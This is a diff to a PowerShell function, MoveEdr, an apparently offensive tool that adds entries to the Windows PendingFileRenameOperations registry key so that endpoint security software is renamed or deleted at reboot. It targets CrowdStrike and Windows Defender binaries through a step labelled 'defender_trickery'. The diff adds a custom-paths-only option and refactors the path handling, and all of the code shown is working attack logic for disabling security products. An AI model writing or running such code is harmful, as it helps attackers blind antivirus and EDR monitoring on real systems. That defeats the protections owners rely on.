@@ -1,6 +1,7 @@
 function MoveEdr{
 	Param(
 		[switch]$Clear,
+		[switch]$CustomOnly,
 		[switch]$DefenderHard,
 		[switch]$Dump,
 		[switch]$IgnoreOld,
@@ -12,6 +13,7 @@ function MoveEdr{
 		[string[]]$Load,
 		[string] $Suffix = "_bak"
 	)
+
 	$regPath = "HKLM:SYSTEM\CurrentControlSet\Control\Session Manager\"
 	$regKey = "PendingFileRenameOperations"
 	
@@ -21,13 +23,17 @@ function MoveEdr{
 	
 	if ($Print){
 		$pendingMoves = GetMoves
-		for($i = 0; $i -lt ($pendingMoves.Count -shr 1); $i++) {
-			Write-Host $pendingMoves[$i*2] --> $(if ($pendingMoves[$i*2+1] -eq "") {"DELETE"} else {$pendingMoves[$i*2+1]})
+		if ($null -eq $pendingMoves){
+			Write-Output "No Pending Moves"
+		} else {
+			for($i = 0; $i -lt ($pendingMoves.Count -shr 1); $i++) {
+				Write-Host $pendingMoves[$i*2] --> $(if ($pendingMoves[$i*2+1] -eq "") {"DELETE"} else {$pendingMoves[$i*2+1]})
+			}
 		}
 		Return
 	}
 	
-	if ($Clear){
+	if ($Clear) {
 		Clear-ItemProperty -ErrorAction silentlyContinue -Path $regPath -Name $regKey
 		Return
 	}
@@ -44,19 +50,14 @@ function MoveEdr{
 		Return
 	}
 	
-	if ($FullyCustomPaths){
-		$moves = @($FullyCustomPaths | % {"\??\$_"})
-	}
-	
-	if ($CustomPaths) {
-		$moves = @($CustomPaths | % {"\??\$_", "\??\${_}$Suffix"})
-	}
-	
-	if ($Load){
+	if ($Load) {
 		$moves = $Load
 	}
-	
-	if (!($CustomPaths -or $FullyCustomPaths -or $Load)){
+	elseif ($CustomOnly){
+		$moves = @($CustomPaths | ForEach-Object {"\??\$_", "\??\${_}$Suffix"}) +
+				 @($FullyCustomPaths | ForEach-Object {"\??\$_"})
+	}
+	else {
 		$paths = @(
 			# Crowdstrike
 			 "C:\Program Files\CrowdStrike",
@@ -85,17 +86,19 @@ function MoveEdr{
 			$defenderPlatforms = (Get-ChildItem 'C:\ProgramData\Microsoft\Windows Defender\Platform').Name
 			$defenderExes = "MsMpEng.exe", "MpDefenderCoreService.exe", "NisSrv.exe"
 			$defender_trickery = @("C:\ProgramData\Microsoft", "C:\ProgramData\Microsoft$Suffix") +
-					 @(@(foreach ($platform in $defenderPlatforms) {foreach ($exe in $defenderExes) {"C:\ProgramData\Microsoft$Suffix\Windows Defender\Platform\$platform\$exe"}}) | % {"$_","${_}$Suffix"}) +
+					 @(@(foreach ($platform in $defenderPlatforms) {foreach ($exe in $defenderExes) {"C:\ProgramData\Microsoft$Suffix\Windows Defender\Platform\$platform\$exe"}}) | ForEach-Object {"$_","${_}$Suffix"}) +
 					 @("C:\ProgramData\Microsoft$Suffix", "C:\ProgramData\Microsoft")
 		}
 
-		$moves = @($paths | % {"\??\$_", "\??\${_}$Suffix"}) + @($defender_trickery | % {"\??\$_"})
+		$moves = @($paths + $CustomPaths | ForEach-Object {"\??\$_", "\??\${_}$Suffix"}) +
+				 @($FullyCustomPaths + $defender_trickery | ForEach-Object {"\??\$_"})
 	}
 	
 	if ($undo) { # reverse the order in which moves are performed from top to bottom and switch source and destination
 		$upperBound = $moves.Count - 1
 		for ($index = 0; $index -lt ($moves.Count -shr 1); $index+=2){
-			$moves[$index],$moves[$index+1],$moves[$upperBound -1 - $index],$moves[$upperBound - $index] = $moves[$upperBound - $index],$moves[$upperBound -1 -$index], $moves[$index+1],$moves[$index]
+			$moves[$index],$moves[$index+1],$moves[$upperBound -1 - $index],$moves[$upperBound - $index] =
+			$moves[$upperBound - $index],$moves[$upperBound -1 -$index], $moves[$index+1],$moves[$index]
 		}
 	}
 
